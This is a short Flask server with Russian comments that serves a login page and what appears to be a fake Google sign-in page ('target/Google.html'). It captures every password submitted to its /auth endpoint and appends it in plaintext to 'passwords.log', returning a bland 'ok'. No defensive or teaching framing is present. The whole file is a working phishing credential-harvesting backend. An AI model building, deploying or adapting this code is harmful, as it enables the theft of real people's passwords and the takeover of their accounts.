from flask import Flask, request, jsonify, send_file, make_response
from flask_cors import CORS
import logging
import sys
import os

# Отключаем лишние логи
logging.getLogger('werkzeug').setLevel(logging.ERROR)
sys.stdout = sys.__stdout__

# Настраиваем логгер для паролей
password_logger = logging.getLogger("password_logger")
password_logger.setLevel(logging.INFO)
file_handler = logging.FileHandler("passwords.log", mode="a", encoding="utf-8")
file_handler.setFormatter(logging.Formatter("%(asctime)s - %(message)s"))
password_logger.addHandler(file_handler)

app = Flask(__name__)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.form
    password = data.get('password')

    # Ручная запись в файл, сразу с flush
    with open("passwords.log", "a", encoding="utf-8") as f:
        f.write(f"🔐 Пароль: {password}\n")
        f.flush()

    return jsonify({"status": "ok"})

@app.route("/")
def index():
    return send_file("target/login.html")

@app.route("/login")
def login():
    return send_file("target/Google.html")

if __name__ == "__main__":
    # Запускаем сервер на всех интерфейсах и нужном порту
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
